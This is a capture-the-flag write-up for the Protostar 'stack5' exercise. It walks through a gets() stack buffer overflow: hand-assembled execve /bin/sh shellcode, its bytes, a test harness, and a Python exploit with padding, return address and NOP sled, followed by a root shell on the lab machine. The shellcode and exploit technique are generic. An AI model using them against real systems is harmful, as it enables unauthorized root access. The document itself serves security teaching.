# STACK 5

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);           // <- Buffer Overflow
}
```

## IDEA

- We can see that is code has Buffer Overflow vulnerability, but we does not have win or get shell function, so, I write my own shellcode by disassemble from nasm code and put it in stack of program with BOF vuln and execute shellcode to get the shell.

## DETAIL

- This assembly code which we use to inject to stack must not have 0x0 byte (or NULL byte), because we read the input as a string, so if it has 0x0 byte, the gets function just terminated at that byte. 

```asm
section .text:
	global _start:
_start:
  push 	0xb
  pop 	eax                ; mov 	eax, 0xb
  xor 	edx, edx     	   ; mov 	edx, 0

  push 	edx                ; mov 	eax, "/bin/sh"
  push 	0x68732f2f
  push 	0x6e69622f
  mov 	ebx, esp

  xor 	ecx, ecx           ; mov 	ecx, 0
  int 	0x80
```

- Objdump and I have shellcode of this assembly file

```asm
λ ~ \ objdump -D shellcode

shellcode:     file format elf32-i386


Disassembly of section .text::

08049000 <_start>:
 8049000:       6a 0b                   push   $0xb
 8049002:       58                      pop    %eax
 8049003:       31 d2                   xor    %edx,%edx
 8049005:       52                      push   %edx
 8049006:       68 2f 2f 73 68          push   $0x68732f2f
 804900b:       68 2f 62 69 6e          push   $0x6e69622f
 8049010:       89 e3                   mov    %esp,%ebx
 8049012:       31 c9                   xor    %ecx,%ecx
 8049014:       cd 80                   int    $0x80
```

- The shellcode

```
\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

- We can play something fun with this shellcode in C

```c
// filename: vuln.c
#include<stdio.h>

int main()
{
  char shellcode[] = "\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";
   ( (void(*)())shellcode )();
  return 0;
}

// gcc -m32 -z execstack -fno-stack-protector -o vuln vuln.c
```

- Compile with flag execstack to enable stack execute shellcode and disable the stack protector to make shellcode work.

```
λ ~ \ gcc -m32 -z execstack -fno-stack-protector -o vuln vuln.c
λ ~ \ ./vuln
$ ls
vuln  vuln.c
$
```

- So the shellcode works pretty well. Let's make some payload to exploit the vulnerability.

## EXPLOIT


```python
# filename: exp.py

payload = "a"*76

ret = "\xfc\xfc\xff\xbf"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload +=  ret + "\x90"*200 + shellcode

print(payload)

# python epx.py > temp.pwn
# (cat temp.pwn; cat) | ./stack5
```

## RESULT

```
root@protostar:/opt/protostar/bin# (cat temp.pwn; cat) | ./stack5
ls
exp.py  final0  final1  final2  format0  format1  format2  format3  format4  heap0  heap1  heap2  heap3  net0  net1  net2  net3  net4  stack0  stack1  stack2  stack3  stack4  stack5  stack6  stack7  temp.pwn
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```